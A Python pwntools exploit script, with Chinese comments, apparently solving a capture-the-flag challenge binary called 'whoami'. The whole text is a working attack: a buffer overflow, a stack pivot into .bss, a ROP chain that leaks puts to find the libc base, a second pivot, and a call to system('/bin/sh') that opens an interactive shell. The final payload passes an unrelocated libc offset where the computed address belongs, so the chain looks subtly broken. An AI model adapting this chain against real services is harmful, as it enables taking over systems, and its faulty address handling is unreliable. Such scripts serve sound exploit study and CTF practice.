from pwn import *

context.log_level='debug'
sh = process("./whoami")
# sh = gdb.debug("./whoami")
elf = ELF("./whoami")
libc = ELF("./libc.so.6")

bss_addr = 0x601040  # 0xF0

leave_ret = 0x4007d6 # leave ; ret0x601040601040
ret = 0x40056e # ret

payload1 = b'a' * 0x20
payload1 += p64(bss_addr + 0xc0)    # rbp 迁移地址
payload1 += p64(leave_ret)
sh.sendlineafter("name:\n", payload1)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_plt = elf.plt['read']

system_libc = libc.symbols['system']
puts_libc = libc.symbols['puts']


pop_rsi_r15 = 0x400841 # pop rsi ; pop r15 ; ret
pop_rdi = 0x400843 # pop rdi ; ret
# read_bss =  0x4007BB # read(0, &bss_data, 0xF0uLL);
read_bss =  0x4007AA
# read(0, buf, 0x30uLL);
# puts("Else?");
# read(0, &bss_data, 0xF0uLL);
# 0xc0 = 0xF0 - 0x30
payload2 = b'a'*0xc0
payload2 += p64(bss_addr + 0x70)  # rbp
payload2 += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)  # puts(puts.got)
payload2 += p64(read_bss)   #  执行read(0,0x601040,0xf0)
# 没有合适的gadget可以控制rdx寄存器, 所以执行当前main函数中的read代码片段，会将rdx设置为一个正常的0xf0，再通过read函数的ROP向更高地址的bss段写入数据，
# pause()
sh.sendlineafter("Else?\n", payload2)

sh.recvline()
libc_base = u64(sh.recvline().ljust(8, b'\x00')) - puts_libc
system_addr = libc_base + system_libc
print("libc_base: " + str(libc_base))

# rdi, rsi, rdx
payload3 = b'a' * 0x70
payload3 += p64(bss_addr + 0x308)   # rbp
payload3 += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss_addr + 0x308) + p64(0) + p64(read_plt)
# 向更高地址的bss段写入数据
payload3 += p64(leave_ret)
sh.sendline(payload3)

payload4 = p64(bss_addr + 0x400)
payload4 += p64(pop_rdi) + p64(bss_addr + 0x308 + 0x20) #对应b'/bin/sh\x00'所在的地址
payload4 += p64(system_libc) 
payload4 += b'/bin/sh\x00'
# 进行第二次栈劫持，将栈劫持到高地址的bss段去执行system
sh.sendline(payload4)

sh.interactive()
